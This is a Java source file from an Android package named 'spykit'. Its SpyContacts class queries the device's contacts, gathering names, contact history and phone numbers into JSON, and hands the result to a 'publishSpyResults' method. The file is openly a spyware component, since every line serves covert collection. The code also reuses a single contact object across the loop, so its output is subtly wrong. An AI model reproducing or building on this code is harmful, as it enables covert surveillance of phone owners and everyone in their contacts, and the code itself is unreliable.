package net.datadeer.app.spykit;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.ContactsContract;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class SpyContacts implements SpyMethod {
    @Override
    public void spy(SpyManager that) {
        JSONArray contacts = new JSONArray();
        JSONObject container = new JSONObject();
        try {
            ContentResolver cr = that.getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cur != null && cur.moveToFirst()) {
                JSONObject contact = new JSONObject();
                do {
                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                    contact.put("_ID",id);
                    contact.put("DISPLAY_NAME",cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
                    contact.put("LAST_TIME_CONTACTED",cur.getString(cur.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED)));
                    contact.put("TIMES_CONTACTED",cur.getString(cur.getColumnIndex(ContactsContract.Contacts.TIMES_CONTACTED)));
                    JSONArray numbers = new JSONArray();
                    if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                        while (pCur != null && pCur.moveToNext()) {
                            String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            numbers.put(phoneNo);
                        }
                        if (pCur != null) pCur.close();
                    }
                    contact.put("numbers",numbers);
                    contacts.put(contact);
                } while (cur.moveToNext());
            }
            if (cur != null) cur.close();
            container.put("contacts",contacts);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        that.publishSpyResults(container);
    }
}
